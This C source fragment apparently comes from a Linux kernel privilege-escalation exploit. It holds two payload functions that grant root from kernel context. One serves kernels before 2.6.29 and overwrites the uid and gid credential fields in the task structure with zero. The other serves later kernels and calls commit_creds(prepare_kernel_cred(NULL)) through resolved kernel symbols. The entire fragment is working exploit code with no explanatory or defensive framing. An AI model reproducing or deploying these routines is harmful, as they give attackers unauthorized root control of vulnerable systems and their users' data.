// get root before 2.6.29 kernel
void get_root_pre_2_6_29 (void)
{
    uid_t uid, *cred;
    size_t byte;

    uid = getuid();
    cred = get_task_struct();
    if (!cred)
        return;

    for (byte = 0; byte < PAGE_SIZE; byte++) {
        if (cred[0] == uid
                && cred[1] == uid
                && cred[2] == uid) {
            cred[0] = cred[1] = cred[2] = cred[3] = 0;
            cred[4] = cred[5] = cred[6] = cred[7] = 0;
        }
        cred++;        
    }
}

// get root after 2.6.29 kernel
void get_root_post_2_6_29 (void)
{
    int (*commit_creds)(void *) = get_ksym("commit_creds");
    void* (*prepare_kernel_cred)(void *) = get_ksym("prepare_kernel_cred");

    commit_creds(prepare_kernel_cred(NULL));
}

